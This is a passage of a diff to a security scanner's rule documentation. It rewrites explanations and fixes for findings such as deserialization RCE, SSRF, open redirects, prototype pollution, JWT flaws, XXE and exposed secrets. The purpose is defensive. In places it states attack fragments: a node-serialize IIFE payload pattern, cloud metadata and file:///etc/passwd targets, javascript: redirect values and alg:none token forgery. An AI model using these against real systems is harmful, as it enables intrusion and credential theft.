-node-serializes serialize/deserialize supports an IIFE payload (rce: _$ND_FUNC$$ = function(){...}()). The deserialize() call evaluates that payload and executes attacker JavaScript on the server.
+node-serializes serialize/deserialize supports an IIFE payload (rce: _$$ND_FUNC$$_function(){...}()). The deserialize() call evaluates that payload and executes attacker JavaScript on the server.
 
 **Risk:** Untrusted serialized input is evaluated, leading directly to remote code execution.
 
-**Why it matters:** The code-deser-node-serialize check verifies that the server does not expose the deser-node-serialize weakness in the code category. The detection runs against the response headers, body, or auxiliary probes (DNS, TLS, async fetch) as appropriate.
+**Why it matters:** node-serialize writes functions as strings with a _$$ND_FUNC$$_ prefix and restores them with eval. Adding () to the end of such a string makes it run during deserialize. This is CVE-2017-5941, public exploits exist, and all they need is a cookie or body field that the app passes to the library. No patched release exists to upgrade to, so the package has to go.
 
 **References:**
 - https://www.npmjs.com/package/node-serialize
@@ -4945,7 +4962,7 @@ unserialize($_COOKIE['x']) or unserialize($request->body) can trigger __wakeup, 
 
 **Risk:** Object injection via PHP unserialize enables property-oriented programming chains and remote code execution.
 
-**Why it matters:** The code-deser-php-unserialize check verifies that the server does not expose the deser-php-unserialize weakness in the code category. The detection runs against the response headers, body, or auxiliary probes (DNS, TLS, async fetch) as appropriate.
+**Why it matters:** unserialize builds objects of any class the application can autoload, and PHP then calls their magic methods: __wakeup on creation, __destruct when they go out of scope. Attackers do not need to inject code. They chain existing classes from frameworks and Composer packages, which is what tools like PHPGGC automate. A cookie or hidden field fed to unserialize is often all it takes for remote code execution.
 
 **References:**
 - https://www.php.net/manual/en/function.unserialize.php
@@ -4975,7 +4992,7 @@ fetch("http://127.0.0.1:8080/..."), fetch("http://[::1]:..."), or fetch("http://
 
 **Risk:** Attacker reaches internal services such as admin panels, databases, or cloud metadata APIs.
 
-**Why it matters:** The code-ssrf-fetch-port check verifies that the server does not expose the ssrf-fetch-port weakness in the code category. The detection runs against the response headers, body, or auxiliary probes (DNS, TLS, async fetch) as appropriate.
+**Why it matters:** The match is a fetch to a literal loopback, private or metadata address, including 169.254.169.254, where cloud instances hand out their credentials. In browser code this is usually a leftover development URL that does nothing for visitors except reveal internal hosts and ports. In server code that leaked into a response it is a map of what the server can reach and, if any part of the URL can be influenced, a route to it.
 
 **References:**
 - https://owasp.org/www-community/attacks/Server_Side_Request_Forgery
@@ -5006,7 +5023,7 @@ fetch(req.query.url) or fetch(`https://api.example.com/${userPath}`) lets attack
 
 **Risk:** Server-side request forgery to internal services, cloud metadata endpoints, or other external systems.
 
-**Why it matters:** The code-ssrf-fetch-user-input check verifies that the server does not expose the ssrf-fetch-user-input weakness in the code category. The detection runs against the response headers, body, or auxiliary probes (DNS, TLS, async fetch) as appropriate.
+**Why it matters:** The server makes this request, so it leaves from inside your network. Point it at http://169.254.169.254/ and a cloud instance can return temporary IAM credentials; point it at localhost and admin ports that were never meant to be public answer. A fixed hostname prefix can still be escaped with a redirect or a crafted path. Checking the string once is not enough either, since DNS can change between validation and connection.
 
 **References:**
 - https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html
@@ -5034,7 +5051,7 @@ axios.get(req.body.url) or axios({ url: `https://api/${userId}` }) issues HTTP f
 
 **Risk:** Outbound requests reach internal services or cloud metadata APIs that the attacker cannot otherwise reach.
 
-**Why it matters:** The code-ssrf-axios-user-input check verifies that the server does not expose the ssrf-axios-user-input weakness in the code category. The detection runs against the response headers, body, or auxiliary probes (DNS, TLS, async fetch) as appropriate.
+**Why it matters:** axios follows redirects by default, so an allowed URL that answers with a 302 can still send the request to an internal address unless each hop is checked. It also sends any default headers configured on the instance, which can hand your Authorization header to whatever host the attacker named. Error messages that include the response body turn blind SSRF into a way to read internal pages.
 
 **References:**
 - https://github.com/axios/axios
@@ -5064,7 +5081,7 @@ xhr.open("GET", userInput) or fetch via XHR with a user-supplied URL allows atta
 
 **Risk:** Server-side XHR can reach internal services or leak response contents through error messages.
 
-**Why it matters:** The code-ssrf-xhr-user-input check verifies that the server does not expose the ssrf-xhr-user-input weakness in the code category. The detection runs against the response headers, body, or auxiliary probes (DNS, TLS, async fetch) as appropriate.
+**Why it matters:** Browsers constrain XMLHttpRequest with the same-origin policy, so the concern is the other environments that provide it: server-side rendering through jsdom, Electron, and polyfills such as xhr2. In those there is no origin to enforce and the request goes out with the process's network access. In pure browser code, a caller-chosen URL is still a way to send the page's data to someone else's host.
 
 **References:**
 - https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/open
@@ -5094,7 +5111,7 @@ got(req.query.url), undici.fetch(userUrl), or node-fetch(requestUrl) perform HTT
 
 **Risk:** SSRF via popular HTTP clients exposes internal services and cloud metadata endpoints.
 
-**Why it matters:** The code-ssrf-got-user-input check verifies that the server does not expose the ssrf-got-user-input weakness in the code category. The detection runs against the response headers, body, or auxiliary probes (DNS, TLS, async fetch) as appropriate.
+**Why it matters:** These Node clients have no concept of an internal address, and their defaults make it worse: got follows redirects and retries failed requests, so one attacker-chosen URL can produce several probes of your network. DNS rebinding also defeats a hostname check done once before the call. Validate the resolved address at connection time with a custom agent or lookup function, or send outbound traffic through an egress proxy.
 
 **References:**
 - https://github.com/sindresorhus/got
@@ -5122,7 +5139,7 @@ Assigning window.location.href to a user-supplied URL performs a top-level navig
 
 **Risk:** Attacker hosts a convincing phishing page at the destination and uses the open redirect as the launchpad.
 
-**Why it matters:** The code-redirect-window-location-href check verifies that the server does not expose the redirect-window-location-href weakness in the code category. The detection runs against the response headers, body, or auxiliary probes (DNS, TLS, async fetch) as appropriate.
+**Why it matters:** The link a victim sees and trusts points at your domain, and your page sends them elsewhere. Phishing uses this to borrow a real domain's reputation and to get past mail filters. A value of javascript:... assigned to location.href also runs as script in your origin, so the same line is DOM XSS. Checking that the string starts with / is not enough, because //evil.example is a valid absolute URL.
 
 **References:**
 - https://owasp.org/www-community/attacks/Unvalidated_Redirects_and_Forwards_Cheat_Sheet
@@ -5154,7 +5171,7 @@ location.replace(userUrl) navigates the current page to the attacker-supplied UR
 
 **Risk:** Phishing campaigns can replace the legitimate history entry, making the back button useless.
 
-**Why it matters:** The code-redirect-location-replace check verifies that the server does not expose the redirect-location-replace weakness in the code category. The detection runs against the response headers, body, or auxiliary probes (DNS, TLS, async fetch) as appropriate.
+**Why it matters:** replace differs from assignment in one way that helps an attacker: the current page is dropped from history, so the back button does not return the victim to your site. The rest matches any client-side redirect. The destination belongs to whoever built the link, and a javascript: value executes in your origin. Parse the target with new URL() against location.origin and compare the origin that results.
 
 **References:**
 - https://developer.mozilla.org/en-US/docs/Web/API/Location/replace
@@ -5181,7 +5198,7 @@ top.location = userInput or parent.location.href = userInput navigates the top-m
 
 **Risk:** Cross-frame navigation to attacker-controlled pages bypasses frame protections and supports phishing chains.
 
-**Why it matters:** The code-redirect-top-location check verifies that the server does not expose the redirect-top-location weakness in the code category. The detection runs against the response headers, body, or auxiliary probes (DNS, TLS, async fetch) as appropriate.
+**Why it matters:** Frame-busting code and OAuth popups often set top.location, and the danger depends on where the value comes from. Inside a frame, a URL taken from the query string or a postMessage lets whoever controls that input navigate the entire tab, replacing your site with theirs while the user believes they are still on it. Browsers restrict cross-origin frames from doing this without a user gesture, so expect the attack to arrive as a click.
 
 **References:**
 - https://owasp.org/www-community/attacks/Cross_Frame_Scripting
@@ -5209,7 +5226,7 @@ Lodash's _.merge and _.mergeWith, jQuery's $.extend(true, ...), and libraries su
 
 **Risk:** Polluting Object.prototype can lead to XSS, authentication bypass, denial of service, or remote code execution.
 
-**Why it matters:** The code-proto-pollution-deep-merge check verifies that the server does not expose the proto-pollution-deep-merge weakness in the code category. The detection runs against the response headers, body, or auxiliary probes (DNS, TLS, async fetch) as appropriate.
+**Why it matters:** A recursive merge walks into nested objects and copies each key. JSON.parse happily creates an own property named __proto__, so when the merge recurses into it the write lands on Object.prototype and every object in the process inherits it. The effect depends on what later reads a missing property: an isAdmin flag that suddenly exists, template options that become code execution on the server, or an attribute that turns into XSS in the browser.
 
 **References:**
 - https://github.com/lodash/lodash/pull/4759
@@ -5241,7 +5258,7 @@ _.merge(target, userInput) and _.defaultsDeep(target, userInput) recursively cop
 
 **Risk:** Object.prototype pollution enables XSS, authentication bypass, and DoS via type-confusion gadgets.
 
-**Why it matters:** The code-proto-pollution-lodash-merge check verifies that the server does not expose the proto-pollution-lodash-merge weakness in the code category. The detection runs against the response headers, body, or auxiliary probes (DNS, TLS, async fetch) as appropriate.
+**Why it matters:** Lodash fixed this class in stages across the 4.17 line, merge in 4.17.11 and defaultsDeep in 4.17.12, so the version number is the first thing to check. Bundled copies are the usual surprise, because a transitive dependency can pin an old Lodash long after your direct one was upgraded, and npm ls lodash shows every copy. On a patched version the call is only risky if your own code then treats merged keys as trusted.
 
 **References:**
 - https://snyk.io/vuln/SNYK-JS-LODASH-590103
@@ -5266,11 +5283,11 @@ function safeMerge<T>(a: T, b: Record<string, unknown>): T {
 ### `code-proto-pollution-object-assign-proto` [code / medium / body-pattern]
 **Object.assign with __proto__ key**
 
-Object.assign(target, JSON.parse(userInput)) or spread {...userInput} into a target object copies a __proto__ key literally; combined with a subsequent access, this can pollute Object.prototype in engines that honor the assignment.
+Object.assign(target, JSON.parse(userInput)) copies a __proto__ key through the setter, which swaps the prototype of target for an object the attacker wrote.
 
-**Risk:** Object.prototype pollution enables XSS, type confusion, and bypass of authorization checks.
+**Risk:** An attacker-chosen prototype supplies inherited values for properties the code never set, which can bypass authorization checks that read them.
 
-**Why it matters:** The code-proto-pollution-object-assign-proto check verifies that the server does not expose the proto-pollution-object-assign-proto weakness in the code category. The detection runs against the response headers, body, or auxiliary probes (DNS, TLS, async fetch) as appropriate.
+**Why it matters:** Object.assign is safer than a recursive merge because it only copies top-level keys and never descends, so it does not pollute Object.prototype for the whole process. The narrower problem is that it uses ordinary assignment: a top-level __proto__ key from JSON.parse replaces the prototype of that one target object, and values like role or isAdmin then appear on it by inheritance. Spread syntax defines the key as an own property and does not have this problem.
 
 **References:**
 - https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/assign
@@ -5299,7 +5316,7 @@ Hand-rolled recursive merge functions that iterate Object.keys(source) and recur
 
 **Risk:** Same downstream impact as library-driven prototype pollution: XSS, auth bypass, DoS.
 
-**Why it matters:** The code-proto-pollution-recursive-merge check verifies that the server does not expose the proto-pollution-recursive-merge weakness in the code category. The detection runs against the response headers, body, or auxiliary probes (DNS, TLS, async fetch) as appropriate.
+**Why it matters:** Hand-written merge and clone helpers are the most common source of this bug because they look too simple to be wrong: for each key, recurse if the value is an object, otherwise assign. With a key of __proto__, target[key] returns Object.prototype and the next assignment writes to it. constructor.prototype gets there too, so filtering only __proto__ leaves a second route open. It is worth searching for this loop by hand, since no dependency audit will flag it.
 
 **References:**
 - https://github.com/HoLyVieR/prototype-pollution-nsec18
@@ -5325,7 +5342,7 @@ jwt.verify(token, '') or jwt.verify(token, undefined) passes an empty or missing
 
 **Risk:** Tokens forged by attackers with a known-empty or predictable secret pass verification and grant arbitrary identities or privileges.
 
-**Why it matters:** The code-jwt-verify-no-secret check verifies that the server does not expose the jwt-verify-no-secret weakness in the code category. The detection runs against the response headers, body, or auxiliary probes (DNS, TLS, async fetch) as appropriate.
+**Why it matters:** An empty or undefined key usually comes from a missing environment variable rather than a deliberate choice, which is why it can reach production unnoticed. Libraries differ in what happens next: some throw, and some older versions treat a missing key as permission to accept an unsigned token. An HMAC with an empty key can also be computed by anyone. Treat a missing secret as a startup failure instead of letting the verify call discover it.
 
 **References:**
 - https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/
@@ -5355,7 +5372,7 @@ jwt.sign(payload, 'secret') or jwt.sign(payload, process.env.JWT_SECRET) where J
 
 **Risk:** Attackers recover the HS256 secret and forge tokens for any identity, bypassing authentication entirely.
 
-**Why it matters:** The code-jwt-hs256-weak-secret check verifies that the server does not expose the jwt-hs256-weak-secret weakness in the code category. The detection runs against the response headers, body, or auxiliary probes (DNS, TLS, async fetch) as appropriate.
+**Why it matters:** HS256 tokens can be attacked offline. Anyone holding one valid token has the message and its signature, so they can test candidate secrets on their own hardware with hashcat without sending you a single request. A short literal in the jwt.sign call is weak by construction and also ships with the source. Once recovered, the secret signs a valid token for any user, including an admin.
 
 **References:**
 - https://datatracker.ietf.org/doc/html/rfc7518#section-3.2
@@ -5379,7 +5396,7 @@ jwt.verify(token, secret, { algorithms: ['none'] }) explicitly allows the 'none'
 
 **Risk:** Tokens are accepted without signatures or with a key the attacker controls, granting impersonation.
 
-**Why it matters:** The code-jwt-none-algorithm check verifies that the server does not expose the jwt-none-algorithm weakness in the code category. The detection runs against the response headers, body, or auxiliary probes (DNS, TLS, async fetch) as appropriate.
+**Why it matters:** alg: none is a legal value in the JWT specification for tokens with no integrity protection, and it has no place in a verifier. A JWT is only base64url text, so anyone can edit the payload, set alg to none, drop the signature and present themselves as any user. Naming none in the allowed list means the library does as it was told and skips the signature check.
 
 **References:**
 - https://github.com/auth0/node-jsonwebtoken/security/advisories/GHSA-qwph-4952-7xr6
@@ -5407,7 +5424,7 @@ Pages that write to innerHTML, document.write, or eval without first creating a 
 
 **Risk:** DOM XSS via injected strings cannot be blocked without Trusted Types enforcement.
 
-**Why it matters:** The code-csp-no-trusted-types check verifies that the server does not expose the csp-no-trusted-types weakness in the code category. The detection runs against the response headers, body, or auxiliary probes (DNS, TLS, async fetch) as appropriate.
+**Why it matters:** Inline script here writes to innerHTML, document.write or eval and no Trusted Types policy exists to gate those sinks. Trusted Types makes them refuse plain strings, so the few places that build HTML have to go through one named function you can audit. This is hardening rather than a bug report: the check found the sinks, not a path from user input to them. Browser support is not universal, so keep sanitizing as well.
 
 **References:**
 - https://w3c.github.io/trusted-types/dist/spec/
@@ -5441,7 +5458,7 @@ Pages that render user-controlled HTML but lack both a Trusted Types policy and 
 
 **Risk:** Attacker-controlled HTML strings reach innerHTML / insertAdjacentHTML unchecked, enabling stored DOM XSS.
 
-**Why it matters:** The code-csp-missing-trusted-types check verifies that the server does not expose the csp-missing-trusted-types weakness in the code category. The detection runs against the response headers, body, or auxiliary probes (DNS, TLS, async fetch) as appropriate.
+**Why it matters:** The page already sends a Content-Security-Policy and its inline scripts write HTML, but the policy has no require-trusted-types-for 'script'. Adding that directive is cheap on a page with few sinks, because every violation can be collected in report-only mode first. Until it is there, the CSP limits where scripts load from but not which strings can be assigned to innerHTML, and that assignment is how DOM XSS works.
 
 **References:**
 - https://web.dev/articles/trusted-types
@@ -5464,7 +5481,7 @@ sessionStorage.setItem('password', pwd) or sessionStorage.setItem('pwd', val) ke
 
 **Risk:** Plaintext password exfiltration via XSS yields direct credential reuse against other services.
 
-**Why it matters:** The code-auth-sessionstorage-passwords check verifies that the server does not expose the auth-sessionstorage-passwords weakness in the code category. The detection runs against the response headers, body, or auxiliary probes (DNS, TLS, async fetch) as appropriate.
+**Why it matters:** sessionStorage survives reloads and is readable by every script on the origin, including analytics tags and any injected payload, and it has no HttpOnly equivalent. A stolen password is worse than a stolen session: it works after the session ends and, since people reuse them, on other sites. The usual reason for this code is carrying a password across a multi-step login, which the server can do with a short-lived token.
 
 **References:**
 - https://cheatsheetseries.owasp.org/cheatsheets/Credential_Storage_Cheat_Sheet.html
@@ -5495,7 +5512,7 @@ Cookies set with SameSite=None but without the Secure flag are rejected by brows
 
 **Risk:** Cross-site requests over HTTP can carry the cookie, enabling CSRF and session hijacking on downgrade.
 
-**Why it matters:** The code-cookie-samesite-none-http check verifies that the server does not expose the cookie-samesite-none-http weakness in the code category. The detection runs against the response headers, body, or auxiliary probes (DNS, TLS, async fetch) as appropriate.
+**Why it matters:** Browsers require Secure on SameSite=None cookies and drop those that lack it, so the first symptom is usually a broken cross-site login or embed rather than a breach. Older browsers that predate the rule accept the cookie, and then it travels cross-site and over plain HTTP too. This finding means a SameSite=None cookie, in a Set-Cookie header or in code on the page, has no Secure attribute.
 
 **References:**
 - https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite
@@ -5526,7 +5543,7 @@ document.cookie = 'sid=' + token without '; Secure' allows the cookie to be tran
 
 **Risk:** Cookie captured on an unencrypted hop enables session hijacking without ever breaking TLS at the user.
 
-**Why it matters:** The code-cookie-missing-secure-http check verifies that the server does not expose the cookie-missing-secure-http weakness in the code category. The detection runs against the response headers, body, or auxiliary probes (DNS, TLS, async fetch) as appropriate.
+**Why it matters:** Without Secure the browser attaches the cookie to any HTTP request for the host, including one an attacker provokes on a hostile network by injecting a link to http://your-site. One plaintext request exposes the value even if every page you serve is HTTPS. document.cookie also cannot set HttpOnly, so a session value written this way is readable from script as well. Set-Cookie from the server gets you both flags.
 
 **References:**
 - https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
@@ -5555,7 +5572,7 @@ Anchor patterns like <a target="_blank" href="javascript:..."> combine reverse t
 
 **Risk:** Opening a javascript: URL in a new tab executes attacker code in that tab's origin context.
 
-**Why it matters:** The code-clickjack-target-blank-js-href check verifies that the server does not expose the clickjack-target-blank-js-href weakness in the code category. The detection runs against the response headers, body, or auxiliary probes (DNS, TLS, async fetch) as appropriate.
+**Why it matters:** A javascript: URL runs when the link is followed, so it is an XSS sink whenever part of the href can be influenced. Frameworks that put user-supplied profile links or redirect targets into href are the usual way it gets there. Inert forms such as javascript:void(0) are ignored by this check, so what remains is either dead markup to replace with a button or a real sink.
 
 **References:**
 - https://owasp.org/www-community/attacks/Reverse_Tabnabbing
@@ -5583,7 +5600,7 @@ Pages without X-Frame-Options: DENY (or a CSP frame-ancestors 'none') can be emb
 
 **Risk:** Attacker overlays a transparent iframe on a decoy page; clicks land on the victim's session, performing unintended actions.
 
-**Why it matters:** The code-clickjack-x-frame-options check verifies that the server does not expose the clickjack-x-frame-options weakness in the code category. The detection runs against the response headers, body, or auxiliary probes (DNS, TLS, async fetch) as appropriate.
+**Why it matters:** Clickjacking needs no script on your site. An attacker loads your page in a transparent iframe over a decoy button, and the victim's click lands on your Delete or Confirm control with their session attached. Only a response header stops it: frame-ancestors in a CSP header or X-Frame-Options, and neither works from a meta tag. Both were absent from this response, or X-Frame-Options was set to ALLOWALL.
 
 **References:**
 - https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
@@ -5607,7 +5624,7 @@ if (hmac(secret, msg) === providedTag) uses == / === to compare authentication t
 
 **Risk:** Network-local attackers recover the HMAC byte-by-byte and forge authenticated requests.
 
-**Why it matters:** The code-timing-hmac-equality check verifies that the server does not expose the timing-hmac-equality weakness in the code category. The detection runs against the response headers, body, or auxiliary probes (DNS, TLS, async fetch) as appropriate.
+**Why it matters:** === stops at the first byte that differs, so a wrong tag with a correct first byte takes slightly longer to reject. With enough requests an attacker can average out the noise and work through the tag one byte at a time, ending with a valid signature for a message of their choosing. It is a hard attack over the internet and far easier from the same cloud region, and the fix is a one-line change.
 
 **References:**
 - https://paragonie.com/blog/2015/11/02/why-hash-youre-using-not-secure
@@ -5636,7 +5653,7 @@ Patterns like new S3Client({ accessKeyId: 'AKIA...', secretAccessKey: '...' }) e
 
 **Risk:** Leaked keys grant whoever holds them the same AWS permissions as the application, including S3, IAM, and STS.
 
-**Why it matters:** The code-cloud-aws-hardcoded-credentials check verifies that the server does not expose the cloud-aws-hardcoded-credentials weakness in the code category. The detection runs against the response headers, body, or auxiliary probes (DNS, TLS, async fetch) as appropriate.
+**Why it matters:** Keys written into the SDK constructor end up in the repository, in build artifacts and, if the module is bundled for the browser, in every visitor's download. An AKIA key pair does not expire and works from anywhere unless a policy says otherwise. Attackers scan public code for these continuously, and their first call is usually sts get-caller-identity to see whose key it is. On AWS compute, a role removes the key altogether.
 
 **References:**
 - https://docs.aws.amazon.com/sdk-for-javascript/v3/developer-guide/loading-node-credentials-iam-role.html
@@ -5664,7 +5681,7 @@ s3.upload({ Bucket, Key, Body, ACL: 'public-read' }) or PutObjectCommand with ex
 
 **Risk:** Public S3 objects leak customer data, backups, or sensitive logs at internet scale.
 
-**Why it matters:** The code-cloud-aws-s3-upload-no-acl check verifies that the server does not expose the cloud-aws-s3-upload-no-acl weakness in the code category. The detection runs against the response headers, body, or auxiliary probes (DNS, TLS, async fetch) as appropriate.
+**Why it matters:** Setting ACL: 'public-read' on upload makes that object readable by anyone with the URL, no signature needed, and keys are often guessable because they follow a pattern such as invoices/1234.pdf. The code path tends to start with public avatars and later get reused for something private. S3 Block Public Access overrides this ACL and is on by default for new buckets, so a working public-read call means it was turned off.
 
 **References:**
 - https://docs.aws.amazon.com/AmazonS3/latest/userguide/access-control-best-practices.html
@@ -5695,7 +5712,7 @@ Azure blob uploads that set container access level to 'blob' or 'container' make
 
 **Risk:** Public containers expose uploaded documents, backups, and user-generated content to anyone who guesses the URL.
 
-**Why it matters:** The code-cloud-azure-blob-upload-no-acl check verifies that the server does not expose the cloud-azure-blob-upload-no-acl weakness in the code category. The detection runs against the response headers, body, or auxiliary probes (DNS, TLS, async fetch) as appropriate.
+**Why it matters:** A container's access level applies to everything in it. blob allows anonymous reads of any blob whose URL is known, and container also lets anyone list the contents, so no guessing is needed at all. Setting this in upload code means a container created for one public use can quietly expose later uploads. Azure can disable anonymous access for a whole storage account, which overrides this setting.
 
 **References:**
 - https://learn.microsoft.com/azure/storage/blobs/anonymous-read-access-configure
@@ -5825,11 +5842,11 @@ async function safeFetch(url: string) {
 ### `xml-external-entity` [code / high / body-pattern]
 **XML external entity (XXE) risk**
 
-XML is being parsed without explicit external entity restrictions.
+The response contains an XML entity declaration with an external SYSTEM or PUBLIC identifier.
 
 **Risk:** An XXE attack using a crafted XML payload can read server-side files, make SSRF requests, or cause denial-of-service via recursive entity expansion (billion laughs attack).
 
-**Why it matters:** XML parsers that allow SYSTEM/PUBLIC entities can be abused to load external content at the server level.
+**Why it matters:** XXE lives in the parser's defaults: entity declarations are part of the XML standard and many libraries honor them unless told otherwise. A SYSTEM entity pointing at file:///etc/passwd pulls that file into the parsed document, and one pointing at an internal URL makes the server send a request. A declaration in a response means someone wrote or submitted one, so check whether this endpoint accepts XML at all. SOAP, SAML, DOCX and SVG are common ways in.
 
 **References:**
 - https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html
@@ -5921,7 +5938,7 @@ Vendor default usernames or passwords detected in configuration or source.
 
 **Risk:** Default credentials (admin/admin, root/root, admin/password) are the first thing attackers try. They are published in vendor documentation and widely known, making any system using them trivially compromised.
 
-**Why it matters:** Software shipped with default credentials must have them changed before first exposure to any network.
+**Why it matters:** This matches pairs like admin/admin or root/root written in the page, skipping banners that tell you to change them. A pair in a page is a strong clue that the documented login still works, and the only way to know is to try it on a system you own. Automated scanners spray exactly these combinations across the internet, so an exposed default login will be tried.
 
 **References:**
 - https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html
@@ -5946,11 +5963,11 @@ psql -U postgres -c "ALTER USER postgres PASSWORD 'new_strong_password';"
 ### `hardcoded-secrets` [code / critical / body-pattern]
 **Hard-coded secret values in source**
 
-API keys, tokens, or secret strings are embedded directly in the source code.
+API keys, tokens, or secret strings are embedded directly in the source code, including OpenAI (sk-proj-) and Anthropic (sk-ant-) API keys.
 
 **Risk:** Secrets embedded in source code are committed to version history, included in build artifacts, and potentially exposed in client-side bundles, giving anyone with the code or the deployed JS file access to your third-party services, databases, and APIs.
 
-**Why it matters:** Secrets in source are nearly impossible to fully remove once committed: use environment variables and rotate immediately.
+**Why it matters:** Secrets in source are nearly impossible to fully remove once committed: use environment variables and rotate immediately. Model-provider keys are a common case now. OpenAI project keys start with sk-proj- and Anthropic keys with sk-ant-, and either one in a client bundle lets anyone run requests billed to your account.
 
 **References:**
 - https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html
@@ -6958,14 +6975,14 @@ const url = new URL(redirect);
 if (!ALLOWED.includes(url.hostname)) throw new Error('Invalid');
 ```
 
-### `directory-listing` [content / high / body-pattern]
+### `directory-listing` [content / medium / body-pattern]
 **Directory Listing Appears Enabled**
 
-The response contains patterns indicating directory listing is enabled.
+The response looks like a server-generated directory index: an Index of / title or heading, an IIS [To Parent Directory] link, or a pre-formatted list of links with dates.
 
-**Risk:** Attackers can browse your server's file structure, discovering sensitive files.
+**Risk:** Nobody has to guess file names any more. A listing shows backups, archives, config copies and uploads that were never linked from the site, and each can be downloaded directly. The listing itself is only a map: how bad it is depends on what is in the folder.
 
-**Why it matters:** Directory listing allows anyone to see all files in a directory when no index file is present.
+**Why it matters:** Servers generate these pages when a directory has no index file and autoindex (Nginx) or Options +Indexes (Apache) is on. To confirm, open the URL and read what is listed. Public downloads in a folder meant to be browsed are fine. Files like .sql, .zip, .bak or a user uploads folder are the real finding, and should be treated as already copied, since search engines index these pages. Turning listing off does not protect the files: they stay reachable to anyone who has the URL.
 
 **References:**
 - https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/
@@ -6973,9 +6990,9 @@ The response contains patterns indicating directory listing is enabled.
 - https://owasp.org/Top10/A05_2021-Security_Misconfiguration/
 
 **Fix:**
-- Disable directory listing in your web server configuration.
-- Ensure every directory has an index file.
-- Review exposed directories for sensitive files.
+- Turn listing off: autoindex off in Nginx, Options -Indexes in Apache, directoryBrowse enabled=false in IIS, and no browse option on a Caddy file_server.
+- Read the listing before you close it, move or delete backups, dumps and config copies, and rotate any credential they held.
+- Keep private files outside the web root, behind application authentication.
 - **Nginx** (nginx):
 ```nginx
 autoindex off;
@@ -7009,7 +7026,7 @@ location ~ /\. { deny all; return 404; }
 location ~ \.(env|sql|bak|config|log)$ { deny all; return 404; }
 ```
 
-### `outdated-js-libs` [content / high / body-pattern]
+### `outdated-js-libs` [content / medium / body-pattern]
 **Potentially Outdated JavaScript Libraries**
 
 The page references JavaScript libraries that are either below a version with known security vulnerabilities, or are deprecated/in maintenance mode with no further security patches.
@@ -7082,28 +7099,28 @@ remove_action('wp_head', 'wp_generator');
 add_filter('the_generator', '__return_empty_string');
 ```
 
-### `dangerous-inline-js` [content / medium / body-pattern]
+### `dangerous-inline-js` [content / low / body-pattern]
 **Potentially Dangerous Inline JavaScript**
 
-The page contains inline JavaScript with potentially dangerous patterns like eval(), document.write().
+The page contains inline JavaScript with potentially dangerous patterns such as document.write(), new Function() or a string passed to setTimeout.
 
 **Risk:** Dangerous JavaScript patterns can be exploited via XSS.
 
-**Why it matters:** Patterns like eval(), document.write(), and direct innerHTML assignment with user input are common XSS vectors.
+**Why it matters:** Patterns like document.write() and new Function() are common XSS vectors when they are given user input. This check sees the pattern and not the data flow, so read the call and find out where its argument comes from.
 
 **References:**
 - https://owasp.org/www-community/attacks/xss/
 - https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP
 
 **Fix:**
-- Replace eval() with JSON.parse().
-- Use textContent instead of innerHTML.
+- Replace document.write() with DOM methods and textContent.
+- Pass a function to setTimeout and setInterval rather than a string.
 - Move inline scripts to external files.
 - Use DOMPurify to sanitize HTML.
 - **Safe alternatives** (javascript):
 ```javascript
-const data = JSON.parse(jsonString);
 element.textContent = userInput;
+setTimeout(() => refresh(), 1000);
 import DOMPurify from 'dompurify';
 element.innerHTML = DOMPurify.sanitize(htmlContent);
 ```
@@ -7136,7 +7153,7 @@ proxy_hide_header Server;
 const nextConfig = { poweredByHeader: false };
 ```
 
-### `sensitive-comments` [content / medium / body-pattern]
+### `sensitive-comments` [content / low / body-pattern]
 **Sensitive Keywords in HTML Comments**
 
 HTML comments containing potentially sensitive information detected.
@@ -7166,7 +7183,7 @@ Debug/error indicators that reveal internal application details detected.
 
 **Risk:** Debug output exposes internal file paths, framework versions, database types, and application logic.
 
-**Why it matters:** Debug mode and verbose error messages are invaluable during development but catastrophic in production.
+**Why it matters:** Detection covers X-Debug-Token headers (Symfony's profiler), Python tracebacks, Node stack traces, SQLSTATE errors and PHP fatal errors in the response. Each reveals how the app is built: absolute paths, package versions, SQL fragments. Symfony's profiler, when reachable, goes further and shows request data for past requests. To confirm, load the URL in a private window: if you see a stack trace without logging in, so does every visitor.
 
 **References:**
 - https://cheatsheetseries.owasp.org/cheatsheets/Error_Handling_Cheat_Sheet.html
@@ -7215,11 +7232,11 @@ Content-Security-Policy: frame-src https: 'self';
 ### `token-exposure` [content / high / body-pattern]
 **Authentication Tokens Exposed in Page Source**
 
-Tokens or session identifiers exposed in the HTML source.
+A session identifier (PHPSESSID, JSESSIONID or ASP.NET_SessionId) appears with its value in the page source.
 
-**Risk:** Exposed tokens allow session hijacking.
+**Risk:** Whoever holds the value is that user until the session expires.
 
-**Why it matters:** Authentication tokens should never appear in HTML source. They can be captured by browser extensions, cached by CDNs, or logged by proxies.
+**Why it matters:** A session ID printed into HTML defeats the HttpOnly flag on the cookie, because any script on the page can now read it from the DOM. The usual culprits are a debug panel, a diagnostics comment or a URL with the ID appended. If the page is cached by a CDN, one visitor's session can be served to another, so check the cache headers as well.
 
 **References:**
 - https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html
@@ -7238,23 +7255,24 @@ response.cookies.set('session', token, { httpOnly: true, secure: true, sameSite:
 ### `autocomplete-sensitive` [content / low / body-pattern]
 **Missing Autocomplete Attributes on Sensitive Fields**
 
-Sensitive input fields without proper autocomplete attributes.
+Payment card fields have no autocomplete token.
 
-**Risk:** Browsers may cache sensitive form data on shared or compromised devices.
+**Risk:** This is a usability gap more than a security hole. Without the token, browsers guess what the field is, so card details can be filled into the wrong box or not offered at all, and people retype them. autocomplete="off" does not stop browsers from saving data, so it is not a fix.
 
-**Why it matters:** The autocomplete attribute tells browsers how to handle form autofill.
